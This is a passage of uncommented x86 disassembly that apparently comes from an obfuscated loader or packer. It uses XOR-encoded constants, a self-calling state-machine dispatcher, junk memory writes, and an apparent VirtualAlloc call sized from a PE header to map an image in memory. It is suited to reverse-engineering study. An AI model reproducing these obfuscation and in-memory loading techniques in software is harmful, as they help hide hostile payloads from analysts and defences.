  428f0b:	mov    ecx,DWORD PTR [ecx]
  428f0d:	xor    ecx,edi
  428f0f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ad]
  428f16:	cmp    cl,al
  428f18:	jne    0x428f6a
  428f1a:	mov    eax,DWORD PTR [ebp-0x14]
  428f1d:	mov    eax,DWORD PTR [eax]
  428f1f:	xor    eax,edi
  428f21:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428f28:	mov    ecx,DWORD PTR [ebp-0xc]
  428f2b:	mov    ecx,DWORD PTR [ecx]
  428f2d:	xor    ecx,edi
  428f2f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428f36:	xor    al,cl
  428f38:	mov    ecx,DWORD PTR [ebp-0x10]
  428f3b:	mov    ecx,DWORD PTR [ecx]
  428f3d:	xor    ecx,edi
  428f3f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428f46:	or     al,cl
  428f48:	mov    ecx,DWORD PTR [ebp-0x14]
  428f4b:	mov    ecx,DWORD PTR [ecx]
  428f4d:	xor    ecx,edi
  428f4f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ad]
  428f56:	cmp    cl,al
  428f58:	jne    0x428f6a
  428f5a:	lea    eax,[ebp-0x4c]
  428f5d:	push   eax
  428f5e:	call   0x428a25
  428f63:	mov    ecx,DWORD PTR [ebp-0x44]
  428f66:	cmp    eax,ecx
  428f68:	je     0x428f74
  428f6a:	mov    eax,DWORD PTR [ebp+0x8]
  428f6d:	xor    eax,edi
  428f6f:	add    eax,ebx
  428f71:	mov    DWORD PTR [ebp+0x18],eax
  428f74:	mov    eax,DWORD PTR [ebp-0x8]
  428f77:	xor    eax,edi
  428f79:	lea    eax,[eax+esi*1+0x3272f5]
  428f80:	xor    eax,edi
  428f82:	mov    ecx,DWORD PTR [ebp+0x8]
  428f85:	mov    edx,DWORD PTR [ebp+0x18]
  428f88:	xor    ecx,edi
  428f8a:	add    ecx,ebx
  428f8c:	cmp    edx,ecx
  428f8e:	je     0x428d8b
  428f94:	mov    eax,DWORD PTR [ebp+0x8]
  428f97:	mov    ecx,DWORD PTR [ebp+0x18]
  428f9a:	xor    eax,edi
  428f9c:	add    eax,ebx
  428f9e:	cmp    ecx,eax
  428fa0:	jne    0x428fb3
  428fa2:	mov    eax,DWORD PTR [ebp-0x8]
  428fa5:	mov    ecx,DWORD PTR [ebp+0x1c]
  428fa8:	xor    eax,edi
  428faa:	lea    eax,[eax+ecx*1+0x3272f5]
  428fb1:	jmp    0x42902a
  428fb3:	push   0x18
  428fb5:	push   DWORD PTR [ebp-0x4]
  428fb8:	lea    eax,[ebp-0x64]
  428fbb:	push   eax
  428fbc:	call   0x42829f
  428fc1:	mov    eax,DWORD PTR [ebp+0x8]
  428fc4:	mov    ecx,DWORD PTR [ebp-0x18]
  428fc7:	xor    eax,edi
  428fc9:	add    eax,ebx
  428fcb:	cmp    eax,ecx
  428fcd:	je     0x428fe2
  428fcf:	mov    eax,DWORD PTR [ebp+0x8]
  428fd2:	xor    eax,edi
  428fd4:	add    eax,ebx
  428fd6:	push   eax
  428fd7:	push   0x18
  428fd9:	lea    eax,[ebp-0x64]
  428fdc:	push   eax
  428fdd:	call   0x428885
  428fe2:	mov    eax,DWORD PTR [ebp-0x4]
  428fe5:	add    eax,0x18
  428fe8:	mov    DWORD PTR [ebp+0x18],eax
  428feb:	push   DWORD PTR [ebp-0x50]
  428fee:	push   DWORD PTR [ebp+0x18]
  428ff1:	mov    eax,DWORD PTR [ebp-0x54]
  428ff4:	add    eax,DWORD PTR [ebp-0x20]
  428ff7:	push   eax
  428ff8:	call   0x42829f
  428ffd:	mov    eax,DWORD PTR [ebp+0x8]
  429000:	mov    ecx,DWORD PTR [ebp-0x18]
  429003:	xor    eax,edi
  429005:	add    eax,ebx
  429007:	cmp    eax,ecx
  429009:	je     0x42901c
  42900b:	push   0x0
  42900d:	push   DWORD PTR [ebp-0x50]
  429010:	mov    eax,DWORD PTR [ebp-0x54]
  429013:	add    eax,DWORD PTR [ebp-0x20]
  429016:	push   eax
  429017:	call   0x428885
  42901c:	mov    eax,DWORD PTR [ebp-0x24]
  42901f:	mov    ecx,DWORD PTR [ebp-0x50]
  429022:	add    DWORD PTR [eax],ecx
  429024:	mov    eax,DWORD PTR [ebp-0x50]
  429027:	add    eax,DWORD PTR [ebp+0x1c]
  42902a:	mov    DWORD PTR [ebp+0x1c],eax
  42902d:	mov    eax,DWORD PTR [ebp-0x8]
  429030:	mov    ecx,DWORD PTR [ebp+0x1c]
  429033:	xor    eax,edi
  429035:	add    eax,ebx
  429037:	imul   eax,ecx
  42903a:	mov    ecx,DWORD PTR [ebp+0x8]
  42903d:	mov    edx,DWORD PTR [ebp-0x28]
  429040:	xor    ecx,edi
  429042:	lea    ecx,[ecx+edx*1+0x3272f5]
  429049:	cmp    eax,ecx
  42904b:	jb     0x428ca9
  429051:	mov    esi,DWORD PTR [ebp+0x14]
  429054:	mov    eax,DWORD PTR [ebp-0x20]
  429057:	mov    DWORD PTR [esi],eax
  429059:	jmp    0x4290a0
  42905b:	mov    ecx,DWORD PTR [ebp+0x8]
  42905e:	mov    edx,DWORD PTR [ebp+0xc]
  429061:	xor    ecx,edi
  429063:	xor    edx,edi
  429065:	add    ecx,ebx
  429067:	add    edx,ebx
  429069:	cmp    ecx,edx
  42906b:	jne    0x42907f
  42906d:	mov    eax,ds:0x7f642ddc
  429072:	imul   eax,eax,0x9f15fccf
  429078:	mov    ds:0x7f642ddc,eax
  42907d:	jmp    0x4290a0
  42907f:	mov    ecx,DWORD PTR [ebp+0x8]
  429082:	xor    ecx,edi
  429084:	add    ecx,ebx
  429086:	cmp    eax,ecx
  429088:	je     0x429096
  42908a:	sub    DWORD PTR ds:0xf861e3c,0x709beac4
  429094:	jmp    0x4290a0
  429096:	and    DWORD PTR ds:0x3343fadc,0x5265ec3f
  4290a0:	pop    edi
  4290a1:	pop    esi
  4290a2:	pop    ebx
  4290a3:	leave  
  4290a4:	ret    0x18
  4290a7:	push   ebp
  4290a8:	mov    ebp,esp
  4290aa:	and    esp,0xfffffff8
  4290ad:	mov    eax,DWORD PTR [ebp+0x20]
  4290b0:	sub    esp,0x14
  4290b3:	push   ebx
  4290b4:	mov    ebx,DWORD PTR [ebp+0x14]
  4290b7:	push   esi
  4290b8:	push   edi
  4290b9:	cmp    eax,0xf89c85a5
  4290be:	jne    0x4290ca
  4290c0:	push   0xf89c85a2
  4290c5:	jmp    0x4291fc
  4290ca:	mov    eax,DWORD PTR [ebp+0x20]
  4290cd:	cmp    eax,0xf89c85a2
  4290d2:	jne    0x4290de
  4290d4:	push   0xf89c85a3
  4290d9:	jmp    0x4291fc
  4290de:	mov    eax,DWORD PTR [ebp+0x20]
  4290e1:	cmp    eax,0xf89c85a3
  4290e6:	jne    0x4290f2
  4290e8:	push   0xf89c85a0
  4290ed:	jmp    0x4291fc
  4290f2:	mov    eax,DWORD PTR [ebp+0x20]
  4290f5:	cmp    eax,0xf89c85a0
  4290fa:	jne    0x429106
  4290fc:	push   0xf89c85a1
  429101:	jmp    0x4291fc
  429106:	mov    ecx,DWORD PTR [ebp+0x20]
  429109:	mov    eax,0xf89c85bc
  42910e:	cmp    ecx,eax
  429110:	jne    0x4291cc
  429116:	mov    eax,DWORD PTR [ebp+0x10]
  429119:	mov    DWORD PTR [esp+0xc],eax
  42911d:	mov    eax,DWORD PTR [ebp+0x18]
  429120:	mov    DWORD PTR [esp+0x14],eax
  429124:	mov    eax,DWORD PTR [ebp+0xc]
  429127:	mov    DWORD PTR [esp+0x18],eax
  42912b:	mov    eax,DWORD PTR [ebp+0x8]
  42912e:	mov    DWORD PTR [esp+0x10],eax
  429132:	mov    eax,DWORD PTR [esp+0x10]
  429136:	mov    ecx,DWORD PTR [esp+0x14]
  42913a:	mov    edi,0x75108ae
  42913f:	xor    eax,edi
  429141:	mov    esi,0x3272f5
  429146:	add    eax,esi
  429148:	mov    DWORD PTR [ecx],eax
  42914a:	mov    eax,DWORD PTR [esp+0xc]
  42914e:	mov    eax,DWORD PTR [eax+0x194]
  429154:	mov    ecx,DWORD PTR [eax]
  429156:	mov    eax,DWORD PTR [esp+0xc]
  42915a:	mov    eax,DWORD PTR [eax+0x194]
  429160:	mov    eax,DWORD PTR [eax]
  429162:	add    eax,DWORD PTR [ecx+0x3c]
  429165:	mov    ecx,DWORD PTR [esp+0xc]
  429169:	mov    ecx,DWORD PTR [ecx+0x1e0]
  42916f:	mov    ecx,DWORD PTR [ecx+0x14]
  429172:	push   0x4
  429174:	push   0x3000
  429179:	push   DWORD PTR [eax+0x50]
  42917c:	push   0x0
  42917e:	call   ecx
  429180:	mov    DWORD PTR [ebx],eax
  429182:	mov    eax,DWORD PTR [esp+0x10]
  429186:	push   DWORD PTR [esp+0xc]
  42918a:	xor    eax,edi
  42918c:	add    eax,esi
  42918e:	mov    DWORD PTR [esp+0x20],eax
  429192:	lea    eax,[esp+0x20]
  429196:	push   eax
  429197:	push   ebx
  429198:	push   DWORD PTR [esp+0x20]
  42919c:	push   DWORD PTR [esp+0x28]
  4291a0:	push   DWORD PTR [esp+0x24]
  4291a4:	call   0x428b69
  4291a9:	mov    eax,DWORD PTR [esp+0x10]
  4291ad:	mov    ecx,DWORD PTR [ebx]
  4291af:	xor    eax,edi
  4291b1:	add    eax,esi
  4291b3:	cmp    ecx,eax
  4291b5:	je     0x429213
  4291b7:	mov    eax,DWORD PTR [esp+0x18]
  4291bb:	mov    ecx,DWORD PTR [esp+0x14]
  4291bf:	xor    eax,edi
  4291c1:	add    eax,esi
  4291c3:	imul   eax,DWORD PTR [esp+0x1c]
  4291c8:	mov    DWORD PTR [ecx],eax
  4291ca:	jmp    0x429213
  4291cc:	mov    ecx,DWORD PTR [ebp+0x20]
  4291cf:	cmp    ecx,0xf89c85a1
  4291d5:	jne    0x4291de
  4291d7:	push   0xf89c85be
  4291dc:	jmp    0x4291fc
  4291de:	mov    ecx,DWORD PTR [ebp+0x20]
  4291e1:	cmp    ecx,0xf89c85be
  4291e7:	jne    0x4291f0
  4291e9:	push   0xf89c85bf
  4291ee:	jmp    0x4291fc
  4291f0:	mov    ecx,DWORD PTR [ebp+0x20]
  4291f3:	cmp    ecx,0xf89c85bf
  4291f9:	jne    0x429213
  4291fb:	push   eax
  4291fc:	push   DWORD PTR [ebp+0x1c]
  4291ff:	push   DWORD PTR [ebp+0x18]
  429202:	push   ebx
  429203:	push   DWORD PTR [ebp+0x10]
  429206:	push   DWORD PTR [ebp+0xc]
  429209:	push   DWORD PTR [ebp+0x8]
  42920c:	call   0x4290a7
  429211:	mov    DWORD PTR [ebx],eax
  429213:	mov    eax,DWORD PTR [ebx]
  429215:	pop    edi
  429216:	pop    esi
  429217:	pop    ebx
  429218:	mov    esp,ebp
  42921a:	pop    ebp
  42921b:	ret    0x1c
  42921e:	push   ebp
  42921f:	mov    ebp,esp
  429221:	sub    esp,0xc
  429224:	mov    eax,0xf89c85a5
  429229:	mov    DWORD PTR [ebp-0x8],eax
  42922c:	mov    DWORD PTR [ebp-0xc],0xf89c85a2
  429233:	mov    ecx,DWORD PTR [ebp-0x8]
  429236:	xor    ecx,0x75108ae
  42923c:	add    ecx,0x3272f5
  429242:	mov    DWORD PTR [ebp-0x4],ecx
  429245:	mov    ecx,DWORD PTR [ebp+0xc]
  429248:	push   eax
  429249:	mov    DWORD PTR [ebp+0xc],ecx
  42924c:	push   DWORD PTR [ebp+0xc]
  42924f:	lea    eax,[ebp-0x4]
  429252:	push   DWORD PTR [ebp+0x8]
  429255:	push   eax
  429256:	push   DWORD PTR [ebp+0xc]
  429259:	push   DWORD PTR [ebp-0xc]
  42925c:	push   DWORD PTR [ebp-0x8]
  42925f:	call   0x4290a7
  429264:	mov    DWORD PTR [ebp-0x4],eax
  429267:	mov    eax,DWORD PTR [ebp-0x4]
  42926a:	leave  
  42926b:	ret    0x8
